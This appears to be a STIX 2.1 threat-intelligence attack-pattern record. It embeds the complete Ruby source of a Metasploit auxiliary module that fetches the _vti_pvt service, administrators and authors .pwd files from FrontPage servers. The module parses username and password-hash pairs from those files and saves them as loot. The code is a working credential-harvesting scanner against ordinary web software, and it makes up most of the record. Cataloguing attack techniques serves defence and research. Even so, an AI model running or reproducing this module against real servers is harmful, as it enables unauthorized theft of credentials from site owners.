{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9b51cda9-ab3d-406c-9cb1-f1753f5d566b",
    "created": "2024-08-14T16:29:35.446779Z",
    "modified": "2024-08-14T16:29:35.446785Z",
    "name": "FrontPage .pwd File Credential Dump",
    "description": " This module downloads and parses the '_vti_pvt/service.pwd' '_vti_pvt/administrators.pwd', and '_vti_pvt/authors.pwd' files on a FrontPage server to find credentials.  'References'     => [ [ 'PACKETSTORM', '11556']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/frontpage_credential_dump.rb",
            "external_id": "frontpage_credential_dump.rb"
        },
        {
            "source_name": "reference",
            "url": "http://sparty.secniche.org/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FrontPage .pwd File Credential Dump',\n      'Description'    => %q{\n        This module downloads and parses the '_vti_pvt/service.pwd',\n        '_vti_pvt/administrators.pwd', and '_vti_pvt/authors.pwd' files on a FrontPage\n         server to find credentials.\n      },\n      'References'     =>\n        [\n          [ 'PACKETSTORM', '11556'],\n          [ 'URL', 'https://insecure.org/sploits/Microsoft.frontpage.insecurities.html'],\n          [ 'URL', 'http://sparty.secniche.org/' ]\n        ],\n      'Author'         =>\n        [\n          'Aditya K Sood @adityaksood', # Sparty tool'\n          'Stephen Haywood @averagesecguy' # Metasploit module'\n        ],\n      'License'        => MSF_LICENSE,\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The base path', '/'])\n    ])\n  end\n\n\n  def get_pass_file(fname)\n    uri = normalize_uri(target_uri.path, '_vti_pvt', fname)\n\n    vprint_status(\"Requesting: #{uri}\")\n    res = send_request_cgi({\n      'uri' => uri,\n      'method' => 'GET',\n    })\n\n    unless res.code == 200\n      vprint_status(\"File #{uri} not found.\")\n      return nil\n    end\n\n    vprint_status(\"Found #{uri}.\")\n\n    unless res.body.lines.first.chomp == '# -FrontPage-'\n      vprint_status(\"File does not contain FrontPage credentials.\")\n      vprint_status(res.body)\n      return nil\n    end\n\n    vprint_status(\"Found FrontPage credentials.\")\n    return res.body\n  end\n\n  def run_host(ip)\n    files = ['service.pwd', 'administrators.pwd', 'authors.pwd']\n    creds = []\n\n    files.each do |filename|\n      source = filename.chomp('.pwd').capitalize\n      contents = get_pass_file(filename)\n\n      next if contents.nil?\n\n      print_good(\"#{ip} - #{filename}\")\n\n      contents.each_line do |line|\n        next if line.chomp == '# -FrontPage-'\n        user = line.chomp.split(':')[0]\n        pass = line.chomp.split(':')[1]\n\n        creds << [source, user, pass]\n      end\n    end\n\n    cred_table = Rex::Text::Table.new(\n      'Header'  => 'FrontPage Credentials',\n      'Indent'  => 1,\n      'Columns' => ['Source', 'Username', 'Password Hash']\n    )\n\n    creds.each do |c|\n      cred_table << c\n    end\n\n    print_line\n    print_line(\"#{cred_table}\")\n\n    loot_name     = 'frontpage.creds'\n    loot_type     = 'text/csv'\n    loot_filename = 'frontpage_creds.csv'\n    loot_desc     = 'FrontPage Credentials'\n\n    p = store_loot(\n      loot_name,\n      loot_type,\n      rhost,\n      cred_table.to_csv,\n      loot_filename,\n      loot_desc)\n\n    print_status \"Credentials saved in: #{p}\"\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}